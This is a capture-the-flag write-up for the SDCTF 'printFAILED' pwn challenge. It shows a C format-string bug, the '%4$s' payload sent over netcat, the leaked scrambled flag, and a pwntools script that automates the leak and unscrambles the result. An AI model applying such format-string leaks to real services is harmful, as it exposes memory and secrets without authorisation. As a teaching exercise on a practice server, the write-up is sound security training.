# printFAILED

## Challenge

This challenge exists to teach some of the basic skills used in the PWN category, by using a challenge from last year's SDCTF as an example. If you follow along with the tutorial to solve the challenge yourself, you'll be given a new flag as proof of your efforts.

[Original Prompt](https://github.com/acmucsd/sdctf-2021/tree/main/pwn/printFailed)

[Video Tutorial](https://www.youtube.com/watch?v=gSLdg4mipYs)

Connect via ```nc printfailed.sdc.tf 1337```

By KNOXDEV

## Solution

The binary suffers from a format specifier vulnerability

```c
puts("you guessed: ");
printf(guess,main,scramble,FLAG_LEN,flag);
```

We see the scrambled string at the 4th offset and recognize ```scramble('sdctf')=tedug```

```
$ nc printfailed.sdc.tf 1337
can you guess the scrambled flag?
%4$s
you guessed: 
tedug|Ui2T`D1e4`jTOU`b`Gb2mVS4`2uT`b`MFBSOjoh`1qQPSUvo2uz~
```

We then can connect and unscramble the flag:

```python
from pwn import *

def leak_flag():
   p = remote('printfailed.sdc.tf',1337,level='error')
   p.sendline(b"%4$s")
   p.recvuntil(b'you guessed:')
   p.recvline()
   resp=p.recvline().strip(b'\n')
   return resp

def unscramble(resp):
   flag=''
   for i in resp:
      flag+=chr(i-1)
   print(flag) 

resp=leak_flag()
unscramble(resp)
```